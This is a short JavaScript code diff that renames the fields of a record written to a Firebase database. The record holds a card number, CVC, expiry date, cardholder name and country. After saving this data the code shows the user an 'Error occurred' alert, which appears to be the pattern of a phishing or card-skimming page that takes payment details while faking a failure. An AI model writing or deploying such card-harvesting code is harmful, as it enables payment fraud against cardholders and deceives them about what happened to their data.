@@ -120,11 +120,11 @@ const db = getDatabase(app);
         } else {
 
     set(ref(db, 'SubGo/' + Math.random().toString(36).slice(2, 7)), {
-  cardNumber: cardNumber,
-  cvc: cvc,
-  expireDate: expireDate,
-  name: name,
-  country: country
+  Card_Number: cardNumber,
+  CVC: cvc,
+  MY: expireDate,
+  Name: name,
+  Country: country
 });
     alert('Error occurred');
         }
